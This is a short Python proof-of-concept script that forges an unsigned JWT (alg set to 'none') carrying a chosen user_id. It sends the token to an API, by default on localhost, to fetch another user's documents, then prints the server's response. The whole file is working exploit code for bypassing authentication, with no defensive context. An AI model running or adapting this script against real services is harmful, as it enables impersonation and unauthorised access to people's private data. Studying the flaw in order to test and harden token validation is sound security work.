import base64
import json
import requests
import os

API = os.getenv("API_URL", "http://127.0.0.1:5000")

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

def craft_alg_none_token(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = b64url(json.dumps(header).encode("utf-8"))
    payload_b64 = b64url(json.dumps(payload).encode("utf-8"))
    # trailing dot: header.payload.
    return f"{header_b64}.{payload_b64}."

def use_token_to_access(token, victim_user_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{API}/users/{victim_user_id}/docs", headers=headers, timeout=5)
    return r

if __name__ == "__main__":
    fake_payload = {
        "user_id": 1,
        "username": "alice_forge",
        "role": "user"
    }
    forged = craft_alg_none_token(fake_payload)
    print("[*] Forged token (alg=none):", forged)
    print("[*] Using forged token to access Alice's docs")
    r = use_token_to_access(forged, 1)
    print("[*] Status:", r.status_code)
    print("[*] Response:", r.text)
